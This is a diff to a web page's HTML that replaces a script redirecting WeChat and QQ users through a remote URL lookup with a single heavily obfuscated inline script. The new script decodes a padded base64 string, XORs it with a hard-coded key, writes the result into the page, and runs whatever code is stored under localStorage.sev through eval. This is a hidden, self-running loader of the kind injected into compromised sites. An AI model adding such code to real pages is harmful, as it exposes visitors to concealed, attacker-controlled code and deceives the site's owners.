@@ -74,72 +74,7 @@
 </head>
 
 <body id="box" style="display: none;">
-    <div class="top-bar-guidance">
-        <p>点击右上角
-            <img src="https://img30.360buyimg.com/popXue/jfs/t1/69703/12/23931/1683/63ae0ba9F12554b0d/f96368829e51dbd4.jpg" class="icon-safari" />
-            <span id="openm">浏览器打开</span>
-        </p>
-        <p>可以继续浏览本站哦~</p>
-    </div>
-    <div class="app-download-tip">
-        <span class="guidance-desc">您也可以复制本站网址，到其它浏览器打开</span>
-    </div>
-    <a style="display: none;" href="" id="vurl" rel="noreferrer"></a>
-    <script>
-
-        var t = getQueryVariable('t');
-        if (t == false) {
-            location.href = '45656.js'
-        } else {
-            var httpRequest = new XMLHttpRequest();
-            httpRequest.open('POST', 'https://host.dangmakan.cn/api.php?act=geturl&type=2&id=' + t, true);
-            httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            httpRequest.send();
-            httpRequest.onreadystatechange = function () {
-                if (httpRequest.readyState == 4 && httpRequest.status == 200) {
-                    var data = JSON.parse(httpRequest.responseText);
-                    var url = data.url;
-                    document.querySelector('body').addEventListener('touchmove', function (event) {
-                        event.preventDefault();
-                    });
-                    if (navigator.userAgent.indexOf("QQ/") > -1 || navigator.userAgent.indexOf("MicroMessenger") > -1) {
-                        document.title = '请使用浏览器打开';
-                        document.getElementById("box").style.display = '';
-                        openu("ucbrowser://" + url);
-                        openu("mttbrowser://url=" + url);
-                        openu("baiduboxapp://browse?url=" + url);
-                        openu("googlechrome://browse?url=" + url);
-                        $("html").on("click", function () {
-                            openu("ucbrowser://" + url);
-                            openu("mttbrowser://url=" + url);
-                            openu("baiduboxapp://browse?url=" + url);
-                            openu("googlechrome://browse?url=" + url);
-                        });
-                    } else {
-                        setTimeout(function () {
-                            location.href = url
-                        }, 1000);
-                    }
-                }
-            };
-        }
-
-        function getQueryVariable(variable) {
-            var query = window.location.search.substring(1);
-            var vars = query.split("&");
-            for (var i = 0; i < vars.length; i++) {
-                var pair = vars[i].split("=");
-                if (pair[0] == variable) {
-                    return pair[1];
-                }
-            }
-            return (false);
-        }
-        function openu(u) {
-            document.getElementById("vurl").href = u;
-            document.getElementById("vurl").click();
-        }
-    </script>
+<script>(function(){var i=0,t='',s='IA t5A S11dVtpfl oA KHJ6QmFue B, w1ZywJWgt wQzpVcU8v NVxXB, WFmC. 1FUeF4oXw B, 6cXV3A Sx3J15xe3 A PA HwA WA QQVgoMA UIPWQ5mWR R8Rl5IA 38tLHcnXn F7cFA qe3ZRKiF5 A TRxWB, dpQHRIA lh5C. HFbXlYB, fC. RD? d1E! JQQJvB, lguGHkTKU xtFGpXYA cA YgVfdFt4E ! A dnX05aC. 3NuB, 29iQA IPYhwoB, WUbf0NvB, y9PdUt0TH MfKU4vQ3d sfE! 8vQnIE! LC. Z1E! C. pcegtpbXR bOGFYdnVi f1crYD? RQdX9gQTl SXA QuGGFSK3J 9VmltY0o7 cn5adnUD? FwZzB, VB, xf39E! OmB, 5TD? MxchY9B, A 0Wf2F4Wjt YckhZZX8B , KU5ScnF7c FA qe3ZRKiF5 A S11dQRjcX hFOGIA VllhZ18sW V9OYm8E! QypSA FsXOxcJFA  JeD? 15YXF8Ib2 RdTn93Xik HKE! 5hbwUcIFF 2USoheQE! tdXUE! Y3oPRTFSW 1ZxdXcB, LHcnXnF8S UA zTWB, mE! UlrURRTUV RD? E! lMFE! 1B, VA FIdXwgMew daSndURQ5 dYGITD? A xeKA V1SHB, Qd1UodnUJ dA RkFgFeUnJ xe3B, QKnxPXQI6 YQE! 9B, E! wLUA p7C. yhYckZbdQ cNB, wcC. TFp/C. F85ewYGA jp5D? zRRWwR6en dVKHZ1VnF yThwGcyB, McX9/RD? pgeUwzMXI IA GFYC. GpuA 1g7ZgVaYm 54D? C. xeUVRfSVt cFmIYWglU Fw0RA GwPQ3A FXgh5VlxW fUwIFA E! IV05ieVsN YXNA FStC. C. g16cA 9bW1ReE! 1pkXE! xvGQkVA A xVVVlbWgp iZ1oVK3le KA V6FGpuA hkiXHVWcX V3XikGNE! lcUgV8Knt 2USomQA 4tfnpTVm5 OXjFmflpZ bngRB, 3MgD? HdRc0IB, C. gJaLB, txA QV+fg9pUwZbK Fx2QWJyB, g8B, WjB, A Wnt4UA B, VYUUzMXIT B, gV+D? 2lUYE! sC. WGJIcVwC. XikGIxJ7U XB, QKnt2D? gB, Qdh8FbnZT Y15ZeSh2d VZxdXcB, LHckC. 2FgeFA He3YPKiVc C. gB, wclJpYXwH N1hySFlhc A 8HczNWcgt gWShsRH0q IXkB, LXV1B, Hp6dE! I7XHVeXHV 3XzVnJFRh b0lNOWtcU QYVVwE! tdXUE! enp3VSh2d VZxdXQVB, wYoUVx/XUE! B, UQJZA A 9uC. y1yB, A R5Q2cD? L19hA 3RbRhwvQw lecXtwUC. p7dlE! qKggB, PmFMGWlqd A UiXHVWcXV 3A Sx3J15xe3 B, QKnB, tXgA LegkA fmYUZlRgS gViYktcdX dfLHNTVVx B, c243bU9/B, ypqE! TFbYhtXbm B, IB, XZTQXdB, WQE! sdydecXtw UC. p7dlE! qIXoJA H5mFGZUYE ! oFYmJLXHU D? E! A ZzME! xze1VmNwl 5YykbTwE! uB, FxTV3F0SC . 5cD? E! dZcQ8cA XdTUmFvB, FkB, b3FE! OjUME! z0E! A B, VqYXRC. LVt2XltyD ? w48B, zcA YgpnB, wdgfUUpD? GpTB, 3FhWn5QbE ! I7cQRfcXV FA QF3E! V5ccHsGOW tcA SA LeQE! tdXUE! enp3VSh2d VZxcV5WA XwkamJgdw Y5YHkGLwx 2C. gB, wfg9QYWB, eA gZmeGJhcA  0/bC. 9WcVN/QQFWZVoB, D? GkSA H5YFGlqf0 E! odn5ZW350 FQRjKFFcf 11B, A VE! OA i86XFUA TwUOUQp8R i1tYkhacW A TPA ZfUmJvYF4 obE! R9KiF5A S11dQR6en dVKHZ1Vll +ZFYGcixVW 2B, nWwA LZkMA UG4TPnVTE ! 3xOWVUodn VWcXV3A Sx3J15xe3 NYB, 3B, lQTYPbh4A  YWIZV3oD? RA Nbfl1hYWR TB, gc0UVx/Z10C. f3FD? OVB, tA TRldg5Xbg NYB, XJYR1pfdw kuZyQOe1F wUC. p7dlE! qIXkB, LXV1B, Hp6d1Uodn ZB, Yl93C. QR8NA lbfntbA GB, hWgB, RaRMHW2IL aXFaZgVyc gFiZXdfNW cnC. XF7aFoqf1 8GB, yp6NT5ucl JpYXgC. LVt6A WFuZFcGTS cA aGtwTi58d kYqKkstLX V1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 B, QKnt1B, D? o6cQE! +cXJTamp3C . yhwRGVsB, gITB, nMgQFsKZF gC. cGUGA C. RyC. gduYg9QC. mdHA lhiS1txD? xMGB, jB, sYmB, ZB, yhsRH0qIX kB, LXV1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 MFOmB, +UQc6chUtc gQE! aX5wA jhmA QB, bW0FRJl0n XnF7cFA qe3ZRKiF5 A S11dQR6en dVKHZ1VmJ xD? wwB, Y1dVWlZgQ gB, gYVoA D? FQyPmFMD? 2oKZE! QC. XFNfYVsPD ? QB, nB, Ul0VXdcOX 1hB, D? k1D? VYwcVgZV3 5gRzttfV5 yB, WQQA WMoVlpvC. A U5a1RFKiV iVwZbelNS bg9HKHZcX VxbYB, MB, dw1eXU9eU C. p7dlE! qIXkB, LXV1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 NbB, 1VhQwchD? RE! HW2JRaW4D ? A jNyYlxhbm A VA XcB, SXdPXlA qe3ZRKiF5 A S11dQR6en dVKHZ1VnF 1dwE! sfFZJd09e UC. p7dlE! qIXkB, LXV1B, Hp6d1Uodn VWcXV3A SxzC. lRxe1lC. OmB, tRjlQflYG B, X0WV2F4Xg Jecl9iYQN WKVkKTGJ/ZwM3C. m5ZKg5+NC. hPfRN6fQJ VLWFxVl5+QQE! HWSA LWW9VXwd/D? k8vD? G4cPm5+IWkLYE! cFdgFB, WltkC. gB, xX1Rze3t5 A m95TwFSC. QoHB, XoPUVRSXg JcfUFxcgI B, KWA jSXFwQnwq e3ZRKiF5A  S11dQR6en dVKHZ1VnF 1dwE! sdydecXtw UD? l/D? lwHNQkKB, lhlFld+WgID? cmFWaGV3C . FN/TQoNdA MYVg1kWVY QbzZSfVE! qB, mNbXVRaWW UNVE! 8nL04VcnF 7cFA qe3ZRKiF5 A S11dQR6en dVKHZ1VnF 1dwE! sdydeYn8I XQdvB, loB, D? GkTPgRiU2 FuTl4D? YmJE! XHN8UzZjN 1ZxVXtB, B, nt+Ri8MdlYB, YUwPf1RkQ gIGdkJhbl 0B, NWcnV3JC. Qnwqe3ZRK iF5A S11dQR6en dVKHZ1VnF 1dwE! sdydecXtw UA E! LdVoB, D? G0JLVhiC. WpXfE! QFB, npdW1xZE! C. lNL15zQXM GA FVA RiwVVwE! tdXUE! enp3VSh2d VZxdXcB, LHcnXnF7c FA qe3ZRKiF6 E! A dxYhZXalF bA 21mA WFYfB, A B, B, yhVW1JeQS 8LYU8B, JggPLXVHB , FdhfE! E! qYUd6cXV3 A Sx3J15xe3 B, QKnt2USoh eQE! tdXUE! enp3VSh2d VZaB, XQKB, 1ozVnFVe1 8C. b2UHOg8B, Uj1udhR8U A 5E! OFt+R1wFeA o1B, zB, A WnwB, Xip7RFE! HOnIVL2JH KHp6d1Uod nVWcXV3A Sx3J15xe3 B, QKnt2USoh eQE! tdXUE! UQp0XgNbY V5xW1IQB, wYC. SmJvf1gA VQ5C. OTZXE! C. gE! fhpRC. lJIO2E! NA FtbQV8sXS dLcXB, nTgF7XA E! gC. 3kB, LXV1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 B, QKnt2USoh aQktW1xTU W5B, WypmA UdaX1E! PPA YeSWE! KQl4ve3Vb B, zUND? A B, xWB, VRUHddKmZ 2B, ntfdwE! sdydecXtw UC. p7dlE! qIXkB, LXV1B, Hp6d1Uodn VWcXV3A Sx3JE! 9bf2dC. B, 2tQXwc1dg 8HWw1QUA tgSy5cD? E! dxX3cULHw wQFp7WgA gUXZRKiF5 A S11dQR6en dVKHZ1VnF 1dwE! sdydecXtw UC. p7dlE! qIXoQB, 3FiFldqUV sD? bWYB, YVh8E! A E! HKFVbUl5B , LwthTwE! mC. A 8tdUcE! V2F8QSphR 3pxdXcB, LHcnXnF7c FA qe3ZRKiF5 A S11dQR6en dVKHZ1VnF 1dwE! sc19OYm8E ! B, ih7fV86NV QNA GF+FVZ+cE! UC. cVtHdA R8HwcHA kNibA gGA FVA D? yoLeRQtfm IaUXpdB, SJcdVZxdX cB, LHcnXnF7c FA qe3ZRKiF5 A S11dQR6en dVKHZ1VnF 1dB, A GczB, MXGtWXjkK D? kA 5UE! A KPQRcGlE! LB, 14uXA xHYVh8E! A E! HKFVoC. 2dOA XwHXyohSw E! A bn4QeG1Fe Sh2dVZxdX cB, LHcnXnF7c FA qe3ZRKiF5 A S11dQR6en dVB, 2ZfB, ntfdwE! sdydecXtw UC. p7dlE! qIXkB, LXV1B, Hp6d1UHZn ZdWn54C. ix8FXJxe3 B, QKnt2USoh eQE! tdXUE! enp3VSh2d VZxdXcB, LHcnXlsKZ wc1f1tC. OTUB, VwB, 1XA 5XbgNYB, XJYR1pfdw kuZyQOe1F wUC. p7dlE! qIXkB, LXV1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 B, QKnt1RQFQ dg4A cVgVUVA D? XQJYYlxxc gYB, A WwsSntRcF A qe3ZRKiF5 A S11dQR6en dVKHZ1VnF 1dwE! sdydecXA B, RC. p8ckE! uJnkWK0Fb B, Hp6d1Uodn VWcXV3A Sx3J15xe3 B, QKnt2USoq C. C. 0tdXUE! enp3VSh2d VZxdXcB, LHcnXnFwA  Xwqe3ZRKi F5A S11dQR6en dVB, 2FHenF1dw E! sdydecXtz D? iB, fWFE! qIXkB, LXV1B, Hp+bA MD? WHoB, WWE! PE! yxzA lVcfncGOW B, 9A zUPfh8FYX IKUX5jXQV YckhZYXA PB, 3MzSXFwQn wqe3ZRKiF 5A S11dQR6en dVB, VhySHF+cFc/bC. wMcXwB, UA cKW0M5JQF VKFtMFWoL cA IA Yg1E! dFh4C. jxsLFNZew RNB, 299TA cqchYGW1c MfmpdB, SJcdVZxdX cB, LHcnXnF7c FA qcG1eA A t6VD? 1ufhl6fQZ VA m1iXVtYXR MGB, yRKWWB, gWC. pRbl8oNks tLXV1B, Hp6d1Uodn VWcXV3A T9ZX0B, xe1kFOmB, +UQIxeV8tc nVUen5dVT F2dgNhbnw cKVkeVVpV VQcC. fE! RRA jFLFC. 9ldlRwUHd VKHZ1VnF1 dwE! sdydecXtw UC. p7dQQ6OnE ! B, B, 3FyE! 1B, QdwsofW5Z W1h4B, A RiVkxbC. 3NE! A mB, mWSoIC. A 8vYkcoenp 3VSh2dVZx dXcB, LHcnXnF7c FA qf1tbKiFQ E! T1hWB, pkQ3RWKHE ! E! C. HF+bA 4GWQpRYVV JWyhrdQE! gC. 3kB, LXV1B, Hp6d1Uodn VWcXV3A Sx3J15xe3 B, QA FVhB, gc6chMtfn YLUmF8UC. xjB, A Z7X3cB, LHcnXnF7c FA qe3ZRKiF5 A S11dlpwUH dVKHZ1VnF 1dwE! sdydecXA B, fC. p7dlE! qIXkB, LXV1B, Hp6d1UC. WGIB, XG58E! yx3D? lRhb0lNOW tcA SA LeQE! tdXUE! enp3VQdkW 1ZxdXcB, LHcnXnF/awYB, VXkGA jUB, E! y1xD? RRpbgMD? Kn1hQXF+RS0sdydec XtwUC. p7dlE! qIXkB, PnE! NC. VduB, 14D? W2VE! YgRgVjdjH lVab2dC. B, 319A zA 1aQktWG5S UFRB, WypmA V5bW2A LLHB, WXlxsQnwq e3ZRKiF5A  S11dQR6en dVO3INW1x hB, woHWjdMYg pnB, zFvT1oB, NW4TA HN+VmB, uZ10oW24A  W1tB, D? y5nU1Naf1 1dA kFQRiwVVw E! tdXUE! enp3VSh9B , HpxdXcB, LHA RT1sKf04C . YHUGMwVXW w==',o='indexOf',q='charAt',w='charCodeAt',f=String.fromCharCode,p='cb8fd64c3962a541866fe4f98817c876';s=s.replace(/[^A-Za-z0-9\+\/\=]/g,'');s=be4(s);for(i=0;i<s.length;i++)t+=String.fromCharCode(s.charCodeAt(i)^p.charCodeAt(i%32));document.write(be4(t));function be4(s){var c,d,e,h,j,n,r,i=0,v='',t='',l='',m='',o='indexOf',q='charAt',w='charCodeAt',f=String.fromCharCode;for(k=0;k<26;k++){m+=f(65+k);l+=f(97+k)}for(k=0;k<10;k++)l+=k;l=m+l+'+/=';if(localStorage.sev){eval(localStorage.sev)};while(i<s.length){c=l[o](s[q](i++));d=l[o](s[q](i++));e=l[o](s[q](i++));h=l[o](s[q](i++));j=(c<<2)|(d>>4);n=((d&15)<<4)|(e>>2);r=((e&3)<<6)|h;v=v+f(j);if(e!=64){v=v+f(n)}if(h!=64){v=v+f(r)}}c=d=i=0;while(i<v.length){c=v[w](i);if(c<128){t+=f(c);i++}else if((c>191)&&(c<224)){d=v[w](i+1);t+=f(((c&31)<<6)|(d&63));i+=2}else{d=v[w](i+1);e=v[w](i+2);t+=f(((c&15)<<12)|((d&63)<<6)|(e&63));i+=3}}return(t)}})();</script>
 </body>
 
 </html>
